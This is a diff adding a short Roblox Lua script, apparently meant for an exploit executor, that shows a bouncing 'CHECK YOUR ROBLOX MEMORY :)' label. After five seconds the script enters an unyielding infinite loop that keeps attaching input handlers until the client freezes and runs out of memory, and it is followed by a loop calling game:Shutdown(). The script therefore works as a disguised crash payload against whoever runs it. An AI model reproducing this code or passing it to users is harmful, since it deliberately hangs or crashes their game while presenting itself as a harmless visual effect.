@@ -1,0 +1,28 @@
+local UserInputService = game:GetService("UserInputService")
+local screenGui = Instance.new("ScreenGui") screenGui.Parent = game.CoreGui
+local logo = Instance.new("TextLabel") logo.Size = UDim2.new(0, 200, 0, 100) logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255) logo.BackgroundTransparency = 1 logo.Text = "CHECK YOUR ROBLOX MEMORY :)" logo.Font = Enum.Font.SourceSansBold logo.TextSize = 48 logo.TextColor3 = Color3.fromRGB(255, 0, 0) logo.BorderSizePixel = 0 logo.Position = UDim2.new(0, 0, 0, 0) logo.Parent = screenGui
+local velocityX = 2 local velocityY = 2
+local function updatePosition() local targetPosition = logo.Position + UDim2.new(0, velocityX, 0, velocityY) local bounceX = false local bounceY = false if targetPosition.X.Offset <= 0 or targetPosition.X.Offset + logo.Size.X.Offset >= workspace.CurrentCamera.ViewportSize.X then velocityX = -velocityX bounceX = true end if targetPosition.Y.Offset <= 0 or targetPosition.Y.Offset + logo.Size.Y.Offset >= workspace.CurrentCamera.ViewportSize.Y then velocityY = -velocityY bounceY = true end if bounceX or bounceY then logo.TextColor3 = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255)) end logo.Position = targetPosition end
+game:GetService("RunService").RenderStepped:Connect(function() updatePosition() end)
+wait(5)
+while true do
+    for i = 1, math.huge do
+        UserInputService.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                mouse1press()
+            end
+        end)
+
+        UserInputService.InputEnded:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                mouse1release()
+            end
+        end)
+    end
+end
+
+while true do
+    for i = 1, math.huge do
+        game:Shutdown()
+    end
+end
